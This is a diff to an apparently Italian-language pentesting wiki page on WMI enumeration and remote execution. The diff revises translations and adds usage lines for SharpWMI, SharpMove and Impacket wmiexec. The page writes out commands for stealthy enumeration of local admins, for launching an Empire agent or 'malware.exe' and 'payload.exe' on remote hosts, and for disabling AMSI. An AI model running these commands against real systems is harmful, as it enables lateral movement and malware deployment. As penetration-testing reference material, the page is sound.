@@ -57,9 +57,9 @@ $c.methods
 # Method listing and invocation
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
-## Enumerazione WMI
+## WMI Enumeration
 
-### Stato del Servizio WMI
+### WMI Service Status
 
 Comandi per verificare se il servizio WMI è operativo:
 ```bash
@@ -85,21 +85,17 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-La query remota di WMI per informazioni specifiche, come gli amministratori locali o gli utenti connessi, è fattibile con una costruzione attenta dei comandi.
+Interrogare WMI da remoto per informazioni specifiche, come amministratori locali o utenti connessi, è fattibile con una costruzione attenta dei comandi.
 
-### **Query WMI Remota Manuale**
+### **Interrogazione WMI Remota Manuale**
 
-L'identificazione furtiva degli amministratori locali su una macchina remota e degli utenti connessi può essere ottenuta attraverso query WMI specifiche. `wmic` supporta anche la lettura da un file di testo per eseguire comandi su più nodi contemporaneamente.
+L'identificazione furtiva degli amministratori locali su una macchina remota e degli utenti connessi può essere ottenuta attraverso specifiche query WMI. `wmic` supporta anche la lettura da un file di testo per eseguire comandi su più nodi contemporaneamente.
 
-Per eseguire un processo in remoto tramite WMI, come il deployment di un agente Empire, viene impiegata la seguente struttura di comando, con l'esecuzione riuscita indicata da un valore di ritorno di "0":
+Per eseguire un processo da remoto tramite WMI, come il dispiegamento di un agente Empire, viene impiegata la seguente struttura di comando, con l'esecuzione riuscita indicata da un valore di ritorno di "0":
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 Questo processo illustra la capacità di WMI per l'esecuzione remota e l'enumerazione del sistema, evidenziando la sua utilità sia per l'amministrazione di sistema che per il pentesting.
-
-## Riferimenti
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 ## Strumenti Automatici
 
@@ -107,4 +103,24 @@ Questo processo illustra la capacità di WMI per l'esecuzione remota e l'enumera
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Puoi anche usare **Impacket's `wmiexec`**.
+
+
+## Riferimenti
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
